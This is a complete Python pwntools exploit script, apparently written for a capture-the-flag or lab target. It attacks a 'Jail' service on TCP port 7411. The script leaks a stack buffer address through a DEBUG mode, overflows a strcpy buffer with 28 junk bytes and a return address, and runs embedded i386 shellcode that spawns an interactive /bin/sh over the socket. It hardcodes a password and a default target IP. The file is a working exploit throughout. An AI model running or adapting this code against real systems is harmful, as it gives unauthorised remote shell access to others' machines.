#!/usr/bin/env python3
"""
breakout.py - "Jail" service (TCP 7411) buffer overflow -> shell

The auth() routine copies the PASS token into a 16-byte stack buffer with
strcpy(). With -z execstack the stack is executable, and DEBUG mode leaks
the buffer address. We smash the saved return address and jump back into
our own socket-reuse shellcode.

Two connections:
  1. leak the userpass buffer address (DEBUG mode)
  2. overflow: 28 junk bytes + return addr + shellcode

Shellcode (27 bytes, no nulls):
  dup2(1, 0)          ; stdout is already the socket -> make it stdin too
  execve("/bin//sh")
"""
import argparse
import sys
import time

from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="info")

# (syscall) dup2(1, 0)  then  execve("/bin//sh", NULL, NULL)
SHELL_BYTES = bytes.fromhex(
    "6a3f58"      # push 0x3f; pop eax          ; eax = 63 (dup2)
    "6a015b"      # push 1; pop ebx             ; ebx = 1 (old fd)
    "31c9"        # xor ecx, ecx                ; ecx = 0 (new fd)
    "cd80"        # int 0x80                    ; dup2(1, 0)
    "6a0b58"      # push 0x0b; pop eax          ; eax = 11 (execve)
    "99"          # cdq                         ; edx = 0
    "52"          # push edx                    ; NULL terminator
    "682f2f7368"  # push 0x68732f2f             ; "//sh"
    "682f62696e"  # push 0x6e69622f             ; "/bin"
    "89e3"        # mov ebx, esp                ; ebx -> "/bin//sh"
    "31c9"        # xor ecx, ecx                ; argv = NULL
    "cd80"        # int 0x80                    ; execve
)

EIP_OFFSET = 28          # verified with cyclic pattern on a local build
PAD_AFTER_RET = 4        # bytes between saved EIP and our shellcode


def grab_buffer_addr(host: str, port: int) -> int:
    """Connection #1: flip DEBUG mode on and read the userpass leak."""
    conn = remote(host, port, timeout=10)
    conn.recvuntil(b"Send USER command.")
    conn.sendline(b"DEBUG")
    conn.recvuntil(b"DEBUG mode on.")
    conn.sendline(b"USER admin")
    conn.recvuntil(b"Send PASS command.")
    conn.sendline(b"PASS 1974jailbreak!")
    conn.recvuntil(b"userpass buffer @ ")
    raw = conn.recvline().strip()
    addr = int(raw, 16)
    log.info("leaked userpass buffer @ 0x%08x", addr)
    conn.close()
    return addr


def craft_payload(base: int) -> bytes:
    """Junk to EIP, return address into the stack, then shellcode."""
    return (
        b"A" * EIP_OFFSET
        + p32(base + EIP_OFFSET + PAD_AFTER_RET)
        + SHELL_BYTES
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="Jail 7411 BOF -> shell")
    parser.add_argument("host", nargs="?", default="10.129.63.36")
    parser.add_argument("--port", type=int, default=7411)
    parser.add_argument(
        "--cmd",
        metavar="CMD",
        help="run one command through the shell and exit (non-interactive)",
    )
    args = parser.parse_args()

    base = grab_buffer_addr(args.host, args.port)

    # Connection #2: fire the overflow
    conn = remote(args.host, args.port, timeout=10)
    conn.recvuntil(b"Send USER command.")
    conn.sendline(b"USER admin")
    conn.recvuntil(b"Send PASS command.")
    conn.sendline(b"PASS " + craft_payload(base))

    # the server is still draining its input loop; give it a moment to land
    # on our shellcode before we talk to the shell
    time.sleep(2.0)
    try:
        conn.recv(timeout=0.5)  # swallow the straggler newline
    except Exception:
        pass

    if args.cmd:
        conn.sendline((args.cmd + "; echo __SHELL_END__").encode())
        try:
            out = conn.recvuntil(b"__SHELL_END__", timeout=10)
            sys.stdout.buffer.write(out)
        except Exception:
            # command probably produced no marker; grab what's there
            sys.stdout.buffer.write(conn.recv(timeout=2))
        conn.close()
        return

    log.success("we're in - enjoy the shell")
    conn.interactive()


if __name__ == "__main__":
    main()
